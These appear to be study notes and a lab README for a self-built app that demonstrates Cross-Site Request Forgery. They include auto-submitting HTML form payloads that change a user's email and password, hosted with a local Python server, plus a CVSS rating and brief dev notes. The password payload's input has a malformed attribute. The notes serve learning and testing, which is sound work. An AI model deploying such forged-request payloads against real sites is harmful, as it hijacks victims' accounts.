# CSRF
Cross Site Request Forgery.

(Notes are heavily inspired from that on PortSwigger, Bug bounty reports, HackerOne and Internet)

## How does it work?
There are three conditions which should be in place for CSRF to work:
1. Relevant action
2. Cookie based session handling (nothing other than cookies validating the user requests)
	- assuming the SameSite Cookies defense are **NOT** in place (SameSite is a browser mechanism that determines when a website's cookies are
	included in a request). Chrome by default enforces so.
3. No unpredictable params

```html
<html>
    <body>
		<!-- sending the request to vulnerable website -->
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Simple CSRF issue in this website

We are going to do a CSRF attack to change the password of the user.

### Exploit

```javascript
<body>
	<!-- sending the request to vulnerable website to change the password -->
	<h1>Hacked!</h1>
	<form action="http://localhost:3000/changepass" method="POST">
		<input type="hidden" password="password" value="hacked" />
	</form>
	<script>
		document.forms[0].submit();
	</script>
</body>
```

Hosting the web page using a simple Python server: `python3 -m http.server 1337` the response would be:

```http
HTTP/1.1 302 Found
X-Powered-By: Express
```

Check the CSRF PR for more. #1
`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` (8.0) in this case, which is debateable.

## Dev Notes
### Mar 18th
- Sign-up functionality was completed read why 409 was used here: [#42](https://github.com/realArcherL/csrf/blob/main/src/routes/user.js#L44)

### Marc 22nd
